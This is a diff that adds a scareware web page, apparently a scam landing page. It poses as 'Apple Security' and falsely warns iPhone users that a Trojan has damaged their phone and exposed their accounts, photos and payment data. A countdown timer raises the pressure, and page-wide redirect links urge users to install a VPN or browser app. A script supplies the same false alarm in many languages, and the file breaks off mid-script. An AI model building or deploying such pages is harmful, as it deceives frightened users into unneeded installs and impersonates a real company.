@@ -1,0 +1,750 @@
+<html><head>
+    <meta http-equiv="refresh" content="10000; url=https://www.google.com">
+    <base href="">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=8">
+    <title class="value_1">あなたのiPhoneが危険にさらされています</title>
+    <meta name="robots" content="noindex">
+    <meta name="googlebot" content="noindex">
+    <meta name="viewport" content="user-scalable=no, initial-scale=1.0, maximum-scale=1.0, width=device-width">
+    <link rel="shortcut icon" href="favicon.png" type="image/png">
+    <link rel="icon" href="favicon.png" type="image/png">
+    <style>
+    .popupBack {
+        position: absolute;
+        width: 100%;
+        height: 100%;
+        z-index: 999;
+    }
+
+    * {
+        -webkit-box-sizing: border-box;
+        -moz-box-sizing: border-box;
+        box-sizing: border-box
+    }
+
+    html {
+        height: 100%;
+        font-family: "SF Pro Text", "SF Pro Icons", "Helvetica Neue", "Helvetica", "Arial", sans-serif;
+    }
+
+    body {
+        margin: 0;
+        min-height: 100%;
+        background-color: #fff;
+        font-family: "SF Pro Text", "SF Pro Icons", "Helvetica Neue", "Helvetica", "Arial", sans-serif;
+        font-size: 14px;
+        line-height: 20px;
+        color: #333
+    }
+
+    .w-button {
+        display: inline-block;
+        padding: 9px 15px;
+        background-color: #3898EC;
+        color: white;
+        border: 0;
+        line-height: inherit;
+        text-decoration: none;
+        cursor: pointer;
+        border-radius: 0
+    }
+
+    /*.redirect {*/
+    /*    display: none;*/
+    /*    width: 100%;*/
+    /*    height: 100%;*/
+    /*    position: absolute;*/
+    /*    z-index: 9999;*/
+    /*    display: none;*/
+    /*}*/
+
+    .body {
+        background-color: #fff;
+        overflow: hidden;
+    }
+
+    .block-final {
+        max-width: 450px;
+        position: absolute;
+        bottom: 2%;
+        left: 2%;
+        right: 2%;
+        z-index: 9999999;
+        overflow: visible;
+        margin-right: auto;
+        margin-left: auto;
+        color: #000;
+        opacity: 0;
+        transition: 0.5s;
+        -webkit-transition: 0.5s;
+        bottom: -200px
+    }
+
+    .button-block {
+        margin-top: 7px;
+        padding: 10px;
+        border-radius: 15px;
+        background-color: #fff;
+        font-weight: bold;
+    }
+
+    .text-block-5 {
+        padding-top: 5px;
+        padding-bottom: 5px;
+        text-transform: uppercase;
+        color: #000;
+        font-size: 15px;
+        font-weight: 500;
+        text-align: left;
+    }
+
+    .text-block-6 {
+        font-size: 1em;
+        color: #333;
+    }
+
+    .bold-text {
+        color: red;
+    }
+
+    .button-2 {
+        width: 100%;
+        height: 35px;
+        background-color: #fff;
+        color: #487ede;
+        font-size: 16px;
+        text-align: center;
+    }
+
+    .header {
+        position: relative;
+        z-index: 99;
+        height: 50px;
+        padding-top: 5px;
+        padding-right: 15px;
+        padding-left: 15px;
+        background-color: #282828;
+    }
+
+    .image {
+        float: left;
+    }
+
+    .paragraph {
+        display: -webkit-box;
+        display: -webkit-flex;
+        display: -ms-flexbox;
+        display: flex;
+    }
+
+    .text-block-7 {
+        padding-top: 8px;
+        padding-left: 10px;
+        float: left;
+        color: #fff;
+    }
+
+    .text {
+        margin-top: 20px;
+        padding-bottom: 20px;
+        background: white;
+        border-top: solid #cecece 1px;
+        border-bottom: solid #cecece 1px;
+        padding-right: 15px;
+        padding-left: 15px;
+        color: rgba(60, 60, 67, 0.6);
+    }
+
+    a {
+        text-decoration: none;
+    }
+
+    .body>a {
+        width: 100%;
+        height: 100%;
+        position: absolute;
+        z-index: 9;
+        text-decoration: none;
+        top: 0;
+        left: 0;
+    }
+
+    .text {
+        color: #000000;
+    }
+
+    .buttons {
+        width: 100%;
+        margin-top: 20px;
+    }
+
+    .left-button {
+        display: inline;
+        width: 50%;
+        height: 100%;
+        float: left;
+        border: 1px solid #cecece;
+    }
+
+    .div-block {
+        display: inline-block;
+        width: 50%;
+        float: right;
+    }
+
+    .div-block-copy {
+        display: inline-block;
+        width: 50%;
+        float: right;
+    }
+
+    .right-button {
+        width: 100%;
+        padding: 0 15px;
+    }
+
+    .install {
+        background: #007AFF !important;
+        border-radius: 8px;
+        font-size: 17px;
+        font-weight: 600;
+        color: #fff !important;
+        width: 100%;
+        height: 50px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+    }
+
+    .text-block-8 {
+        padding-top: 5px;
+        color: #ccc;
+        font-size: 9px;
+        text-align: center;
+    }
+
+    .popup {
+        position: absolute;
+        top: 0px;
+        width: 100vw;
+        height: 100%;
+        max-height: 100vh;
+        background-color: #000;
+        opacity: 0.6;
+        z-index: 100;
+    }
+
+    .heading {
+        font-size: 22px;
+        line-height: 24px;
+        color: #007AFF;
+        font-weight: 400;
+    }
+
+    .date {
+        color: white;
+        float: right;
+        text-align: right;
+    }
+
+    .timer {
+        font-size: 1.1em;
+        font-weight: 400;
+        color: #007AFF;
+        padding-top: 10px;
+    }
+
+    .main {
+        background-color: #f0eff5;
+        height: 100vh;
+        overflow-y: auto;
+        padding-bottom: 20px;
+    }
+
+    .content-popunder {
+        min-height: 105px;
+        margin-bottom: 5px;
+        padding: 10px;
+        border-radius: 15px;
+        background-color: #fff;
+    }
+
+    .icon {
+        float: left;
+        width: 25%;
+    }
+
+    .icon img {
+        max-width: 100%;
+        height: auto;
+    }
+
+    .main-text {
+        float: left;
+        width: 75%;
+        padding-left: 10px;
+    }
+
+    @media (max-height: 570px) {
+        .main {
+            overflow: hidden;
+            height: 100%;
+            max-height: 100vh;
+        }
+
+        .text {
+            margin-top: 10px;
+            padding-left: 10px;
+            padding-right: 10px;
+            padding-bottom: 10px;
+        }
+
+        .heading {
+            font-size: 20px;
+            line-height: 22px;
+            margin-top: 5px;
+            margin-bottom: 0;
+        }
+
+        .buttons {
+            margin-top: 10px;
+        }
+
+        .value_7 {
+            padding: 0;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        .heading {
+            color: #FF3B30 !important;
+        }
+
+        .blue-text {
+            color: #FF3B30 !important;
+        }
+
+        .timer {
+            color: #FF3B30 !important;
+        }
+
+        .install {
+            background: #fad11c !important;
+        }
+
+        .heading.light-scheme {
+
+            color: #007AFF !important;
+        }
+
+        .blue-text.light-scheme {
+
+            color: #007AFF !important;
+        }
+
+        .timer.light-scheme {
+            color: #007AFF !important;
+
+        }
+
+        .install.light-scheme {
+
+            background: #007AFF !important;
+        }
+    }
+
+    @media (prefers-color-scheme: dark) {
+        .text {
+            color: #ffffff;
+        }
+
+        body {
+            color: #fff;
+        }
+
+        .main {
+            background-color: #000;
+        }
+
+        .text {
+            background-color: #1c1c1d;
+            border-color: #fff;
+            color: #fff;
+        }
+
+        .heading {
+
+            color: #FF3B30 !important;
+        }
+
+        .blue-text {
+
+            color: #FF3B30 !important;
+        }
+
+        .timer {
+
+            color: #FF3B30 !important;
+        }
+
+        .install {
+
+            background: #fad11c !important;
+        }
+
+        .heading.light-scheme {
+            color: #007AFF !important;
+        }
+
+        .blue-text.light-scheme {
+            color: #007AFF !important;
+        }
+
+        .timer.light-scheme {
+            color: #007AFF !important;
+        }
+
+        .install.light-scheme {
+            background: #007AFF !important;
+        }
+    }
+    </style>
+    <script>
+    function getURLParameter(name) {
+        return decodeURI(
+            (RegExp(name + '=' + '(.*?)(&|$)').exec(location.search) || [, null])[1] || '');
+    }
+    </script>
+<style type="text/css">.eruda-search-highlight-block{display:inline}.eruda-search-highlight-block .eruda-keyword{background:#fffbe5;color:#5c5c00}</style><style type="text/css">@font-face{font-family:eruda-icon;src:url('data:application/x-font-woff;charset=utf-8;base64,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') format('woff')}[class*=' eruda-icon-'],[class^='eruda-icon-']{font-family:eruda-icon!important;font-size:16px;font-style:normal;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.eruda-icon-arrow-left:before{content:'\f101'}.eruda-icon-arrow-right:before{content:'\f102'}.eruda-icon-caret-down:before{content:'\f103'}.eruda-icon-caret-right:before{content:'\f104'}.eruda-icon-clear:before{content:'\f105'}.eruda-icon-compress:before{content:'\f106'}.eruda-icon-delete:before{content:'\f107'}.eruda-icon-error:before{content:'\f108'}.eruda-icon-expand:before{content:'\f109'}.eruda-icon-eye:before{content:'\f10a'}.eruda-icon-play:before{content:'\f10b'}.eruda-icon-refresh:before{content:'\f10c'}.eruda-icon-reset:before{content:'\f10d'}.eruda-icon-search:before{content:'\f10e'}.eruda-icon-select:before{content:'\f10f'}.eruda-icon-tool:before{content:'\f110'}.eruda-icon-warn:before{content:'\f111'}</style></head>
+
+<body class="body">
+    <a href="/click?lp=1" rel="noreferrer noopener" class="redirect redirectLink">
+        </a><div class="popupBack"><a href="/click?lp=1" rel="noreferrer noopener" class="redirect redirectLink">
+            </a><div class="main"><a href="/click?lp=1" rel="noreferrer noopener" class="redirect redirectLink">
+                <div class="header w-clearfix"><img src="img/logo.jpg" width="35" height="35" alt="" class="image">
+                    <div class="text-block-7 value_2">Apple のセキュリティ</div>
+                    <div class="date">
+                        <script language="Javascript">
+                        var dayNames = new Array("Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday",
+                            "Saturday");
+                        var monthNames = new Array("January", "February", "March", "April", "May", "June", "July",
+                            "August", "September", "October", "November", "December");
+                        var now = new Date();
+                        var dayOfTheWeek = now.getDay();
+                        now.setTime(now.getTime() - 0 * 24 * 60 * 60 * 1000);
+                        document.write(dayNames[(now.getDay())] + " <br> " + now.getDate() + " " + monthNames[(now
+                            .getMonth())] + " " + now.getFullYear());
+                        </script>Saturday <br> 5 July 2025
+                        <br>
+                    </div>
+                </div>
+                <div class="text">
+                    <h1 class="heading value_3">重要なお知らせ。お使いのデバイスがトロイの木馬ウイルスに感染しています！</h1>
+                    <span class="value_4">お使いの携帯電話のメモリはすでに損傷の17％を持っています。 それ以外の場合</span>
+                    <br><span class="value_5">は、迅速なアクションが必要ですデバイスに欠陥があり、以下を含むすべてのデー</span>
+                    <font color="red"><span class="value_6">データが表示されますアカウント、写真、および支払いデータは、第三者が利用できるようになります。</span></font><br><br>
+                    <b><span class="value_7">すぐに信頼性のあるAppStoreのブラウザアプリをインストールしてウイルスを除去し、デバイスを保護してください。</span></b>
+                    <br>
+                    <div id="theTime" class="timer">1 minutes and 14 seconds</div>
+                </div>
+
+                </a><div class="buttons buttons w-clearfix"><a href="/click?lp=1" rel="noreferrer noopener" class="redirect redirectLink">
+                    </a><div class="right-button"><a href="/click?lp=1" rel="noreferrer noopener" class="redirect redirectLink"></a><a href="/click?lp=1" class="install w-button value_8">ウイルスを駆除する</a></div>
+                </div>
+                <div class="text-block-8 value_9">Appleが検出。</div>
+            </div>
+            <div class="block-final" onclick="oop();" style="opacity: 1; transition: 0.5s; bottom: 5px;">
+
+                <div class="content-popunder">
+
+                    <div class="icon">
+                        <img src="img/settings.png" alt="">
+                    </div>
+
+                    <div class="main-text">
+                        <div class="text-block-5 value_10">あなたのiPhoneが危険にさらされています</div>
+                        <div class="text-block-6 value_11">早急な対応が必要である！</div>
+                    </div>
+                </div>
+                <div class="button-block"><span class="button-2 w-button">OK</span></div>
+            </div>
+            <div class="popup" onclick="oop();"></div>
+            <script type="text/javascript">
+            function oop() {
+                document.querySelector('.popup').style.display = 'none'
+                document.getElementsByClassName('block-final')[0].style.bottom = '-200px';
+                document.getElementsByClassName('popup')[0].style.opacity = '0';
+                setTimeout(function() {
+                    document.getElementsByClassName('block-final')[0].style.display = 'none';
+                }, 500)
+            }
+
+            setTimeout(function() {
+                document.getElementsByClassName('block-final')[0].style.bottom = '5px';
+            }, 300);
+            </script>
+
+
+            <script language="JavaScript" type="text/javascript">
+            var sec = 59;
+            var min = 01;
+
+            function countDown() {
+                sec--;
+                if (sec == -01) {
+                    sec = 59;
+                    min = min - 1;
+                } else {
+                    min = min;
+                }
+                if (sec <= 9) {
+                    sec = "0" + sec;
+                }
+                time = (min <= 9 ? "" + min : min) + " minutes and " + sec + " seconds";
+                if (document.getElementById) {
+                    document.getElementById('theTime').innerHTML = time;
+                }
+                SD = window.setTimeout("countDown();", 1000);
+                if (min == '00' && sec == '00') {
+                    sec = "00";
+                    window.clearTimeout(SD);
+                }
+            }
+
+            window.onload = countDown;
+            </script>
+        </div>
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script>
+    const userLang = window.navigator.language.split('-')[0] || window.navigator.userLanguage.split('-')[0];
+    const chines_lang = new Object({
+        value_1: "您的 iPhone 已被洩漏",
+        value_2: "蘋果安全",
+        value_3: "重要的提醒。您的設備目前感染了木馬病毒！",
+        value_4: "您的手機內存已受損 17%。需要立即採取行動，",
+        value_5: "否則該設備將出現故障，並且您的所",
+        value_6: "有數據包括帳戶、照片和付款資料將提供給第三方。",
+        value_7: "立即從 AppStore 安裝受信任的 瀏覽器應用程式以移除病毒並保護您的裝置。",
+        value_8: "刪除病毒",
+        value_9: "由蘋果偵測到。",
+        value_10: "您的 iPhone 已被洩漏",
+        value_11: "需要立即採取行動！"
+    })
+    const text = new Object({
+
+
+        en: {
+            value_1: "Your iPhone Has Been Compromised",
+            value_2: "Apple Security ",
+            value_3: "Important notice. Your device is currently infected with a Trojan virus!",
+            value_4: "Your phone's memory is already having 17% of damage. Prompt ",
+            value_5: "action is required, otherwise, the device will become defective ",
+            value_6: "and all your data including accounts, photos, and payment data will be available to third parties.",
+            value_7: "Immediately install trusted VPN app from AppStore to remove the virus and secure your device.",
+            value_8: "Remove Virus",
+            value_9: "Detected By Apple.",
+            value_10: "Your iPhone Has Been Compromised",
+            value_11: "Immediate Action Is Required!",
+        },
+        it: {
+
+            value_1: "Il vostro iPhone è stato compromesso",
+            value_2: "Sicurezza Apple",
+            value_3: "Avviso importante. Il vostro dispositivo è attualmente infettato da un virus Trojan!",
+            value_4: "La memoria del telefono sta già avendo il 17% dei danni. È necessaria un'azione rapida, ",
+            value_5: "altrimenti il dispositivo diventerà difettoso e tutti i tuoi dati inclusi account, foto e dati di ",
+            value_6: "pagamento saranno disponibili a terzi.",
+            value_7: "Installate immediatamente affidabile applicazione VPN dall'AppStore per rimuovere il virus e proteggere il vostro dispositivo.",
+            value_8: "Rimuovere i virus",
+            value_9: "Rilevato da Apple.",
+            value_10: "Il vostro iPhone è stato compromesso",
+            value_11: "È necessaria un'azione immediata!",
+        },
+        de: {
+            value_1: "Ihr iPhone wurde kompromittiert",
+            value_2: "Apple Sicherheit",
+            value_3: "Wichtiger Hinweis. Ihr Gerät ist derzeit mit einem Trojaner-Virus infiziert!",
+            value_4: "Der Speicher Ihres Telefons weist bereits 17% des Schadens auf. Schnelles Handeln ist ",
+            value_5: "erforderlich, andernfalls das Gerät wird defekt und alle Ihre Daten einschließlich konten, ",
+            value_6: "Fotos und Zahlungsdaten werden Dritten zur Verfügung gestellt.",
+            value_7: "Installieren Sie sofort eine vertrauenswürdige VPN-App aus dem AppStore, um den Virus zu entfernen und Ihr Gerät zu sichern.",
+            value_8: "Virus entfernen",
+            value_9: "Erkannt von Apple.",
+            value_10: "Ihr iPhone wurde kompromittiert",
+            value_11: "Sofortiges Handeln ist erforderlich!",
+
+        },
+        pt: {
+            value_1: "Seu iPhone foi comprometido",
+            value_2: "Segurança da Apple",
+            value_3: "Aviso importante. Seu dispositivo está infectado com um vírus Trojan!",
+            value_4: "A memória do seu celular já está com 17% de dano. É necessária uma ação imediata, caso ",
+            value_5: "contrário o dispositivo ficará com defeito e todos os seus dados, incluindo contas, fotos e ",
+            value_6: "dados de pagamento estarão disponíveis para terceiros.",
+            value_7: "Instale imediatamente o aplicativo VPN confiável da App Store para remover o vírus e proteger seu dispositivo.",
+            value_8: "Remover vírus",
+            value_9: "Detectado pela Apple.",
+            value_10: "Seu iPhone foi comprometido",
+            value_11: "É necessária uma ação imediata!",
+        },
+        fr: {
+            value_1: "Votre iPhone a été compromis",
+            value_2: "Sécurité Apple",
+            value_3: "Avis important. Votre appareil est actuellement infecté par un virus de Troie !",
+            value_4: "La mémoire de votre téléphone est déjà endommagée à 17%. Une action rapide est requise, ",
+            value_5: "sinon l'appareil deviendra défectueux et toutes vos données, y compris les comptes, les ",
+            value_6: "photos et les données de paiement seront mis à la disposition de tiers.",
+            value_7: "Installez immédiatement de confiance VPN app depuis l'AppStore pour supprimer le virus et sécuriser votre appareil.",
+            value_8: "Suppression des virus",
+            value_9: "Détecté par Apple.",
+            value_10: "Votre iPhone a été compromis",
+            value_11: "Une action immédiate s'impose !",
+        },
+        es: {
+            value_1: "Su iPhone ha sido comprometido",
+            value_2: "Seguridad de Apple",
+            value_3: "Aviso importante. Su dispositivo está infectado con un virus troyano.",
+            value_4: "La memoria de su teléfono ya tiene un 17% de daños. Se requiere una acción inmediata, de ",
+            value_5: "lo contrario el dispositivo se volverá defectuoso y todos sus datos, incluidos las cuentas, las ",
+            value_6: "fotos y los datos de pago estarán disponibles para terceros.",
+            value_7: "Instala inmediatamente la aplicación VPN de confianza desde la App Store para eliminar el virus y proteger tu dispositivo.",
+            value_8: "Eliminar virus",
+            value_9: "Detectado por Apple.",
+            value_10: "Su iPhone ha sido comprometido",
+            value_11: "Hay que actuar de inmediato",
+        },
+        ja: {
+            value_1: "あなたのiPhoneが危険にさらされています",
+            value_2: "Apple のセキュリティ",
+            value_3: "重要なお知らせ。お使いのデバイスがトロイの木馬ウイルスに感染しています！",
+            value_4: "お使いの携帯電話のメモリはすでに損傷の17％を持っています。 それ以外の場合",
+            value_5: "は、迅速なアクションが必要ですデバイスに欠陥があり、以下を含むすべてのデー",
+            value_6: "データが表示されますアカウント、写真、および支払いデータは、第三者が利用できるようになります。",
+            value_7: "すぐに信頼性のあるAppStoreのブラウザアプリをインストールしてウイルスを除去し、デバイスを保護してください。",
+            value_8: "ウイルスを駆除する",
+            value_9: "Appleが検出。",
+            value_10: "あなたのiPhoneが危険にさらされています",
+            value_11: "早急な対応が必要である！",
+        },
+        ar: {
+            value_1: "تم اختراق جهاز iPhone الخاص بك",
+            value_2: "أمان Apple",
+            value_3: "إشعار هام. جهازك مصاب حاليًا بفيروس حصان طروادة!",
+            value_4: "ذاكرة هاتفك تحتوي بالفعل على ضرر بنسبة 17%.",
+            value_5: "يلزم اتخاذ إجراء فوري، وإلا سيصبح الجهاز معطلاً",
+            value_6: "وسيتمكن أطراف ثالثة من الوصول إلى جميع بياناتك بما في ذلك الحسابات والصور وبيانات الدفع.",
+            value_7: "قم بتثبيت تطبيق VPN موثوق به من App Store فورًا لإزالة الفيروس وتأمين جهازك.",
+            value_8: "إزالة الفيروس",
+            value_9: "تم الاكتشاف بواسطة Apple.",
+            value_10: "تم اختراق جهاز iPhone الخاص بك",
+            value_11: "يجب اتخاذ إجراء فوري!",
+        },
+
+        ms: {
+            value_1: "iPhone Anda Telah Dikompromi",
+            value_2: "Keselamatan Apple",
+            value_3: "Notis penting. Peranti anda kini dijangkiti virus Trojan!",
+            value_4: "Memori telefon anda sudah mengalami 17% kerosakan. Tindakan segera diperlukan, jika ",
+            value_5: "tidak  peranti akan menjadi rosak dan semua data anda termasuk akaun, foto dan data ",
+            value_6: "pembayaran akan tersedia kepada pihak ketiga.",
+            value_7: "Pasang segera aplikasi VPN yang dipercayai dari App Store untuk mengeluarkan virus dan melindungi peranti anda.",
+            value_8: "Buang Virus",
+            value_9: "Dikesan Oleh Apple.",
+            value_10: "iPhone Anda Telah Dikompromi",
+            value_11: "Tindakan Segera Diperlukan!",
+
+        },
+        ko: {
+            value_1: "귀하의 iPhone이 손상되었습니다",
+            value_2: "애플 보안",
+            value_3: "중요한 공지입니다. 귀하의 장치는 현재 트로이 목마 바이러스에 감염되었습니다!",
+            value_4: "귀하의 휴대폰 메모리는 이미 17%의 손상을 입었습니다. 즉각적인 조치가 필요합니다. ",
+            value_5: "그렇지 않으면 장치에 결함이 발생하고 다음을 포함한 모든 데이터가 손상됩니다. 계",
+            value_6: "정, 사진, 결제 데이터는 제3자에게 공개됩니다.",
+            value_7: "바이러스를 제거하고 장치를 안전하게 보호하려면 즉시 App Store에서 신뢰할 수 있는 VPN 앱을 설치하십시오.",
+            value_8: "바이러스를 제거하십시오",
+            value_9: "Apple에 의해 감지되었습니다.",
+            value_10: "귀하의 iPhone이 손상되었습니다",
+            value_11: "즉각적인 조치가 필요합니다!",
+
+        },
+        th: {
+            value_1: "iPhone ของคุณถูกบุกรุก",
+            value_2: "ความปลอดภัยของแอปเปิ้ล",
+            value_3: "ประกาศสำคัญ ขณะนี้อุปกรณ์ของคุณติดไวรัสโทรจัน!",
+            value_4: "หน่วยความจำโทรศัพท์ของคุณมีความเสียหาย 17% แล้ว จำเป็นต้องดำเนินการทันทีมิฉะนั้นอุปกรณ์จะ",
+            value_5: "ชำรุดและข้อมูลทั้งหมดของคุณรวมถึงบัญชี รูปภาพ และข้อมูลการชำระเงินจะพร้อมใช้งานสำหรับบุคคล",
+            value_6: "ที่สาม",
+            value_7: "ติดตั้งแอป VPN ที่น่าเชื่อถือจาก App Store เพื่อลบไวรัสและปกป้องอุปกรณ์ของคุณทันที.",
+            value_8: "ลบไวรัส",
+            value_9: "ตรวจพบโดย Apple",
+            value_10: "iPhone ของคุณถูกบุกรุก",
+            value_11: "จำเป็นต้องดำเนินการทันที!",
+
+        },
+        tr: {
+            value_1: "iPhone'unuz Ele Geçirildi",
+            value_2: "Apple Güvenliği",
+            value_3: "Önemli uyarı. Cihazınız şu anda Truva atı virüsü ile enfekte!",
+            value_4: "Telefonunuzun hafızasında zaten %17 oranında hasar var.",
+            value_5: "Hemen harekete geçilmezse, cihaz bozulabilir",
+            value_6: "ve hesaplar, fotoğraflar ve ödeme bilgileri dahil tüm verileriniz üçüncü kişilere açık hale gelecektir.",
+            value_7: "Virüsü kaldırmak ve cihazınızı korumak için App Store’dan güvenilir bir VPN uygulamasını hemen yükleyin.",
+            value_8: "Virüsü Kaldır",
+            value_9: "Apple Tarafından Tespit Edildi.",
+            value_10: "iPhone'unuz Ele Geçirildi",
+            value_11: "Derhal Harekete Geçin!",
+        },
+        zh: chines_lang,
+        bo: chines_lang,
+        ii: chines_lang,
+        ug: chines_lang
+    })
+
+    let size = Object.keys(text["en"]).length;
+    let i = 0;
+
+    const msg = function(message) {
+        if (message != undefined) {
+            return alert(message)
+        } else {
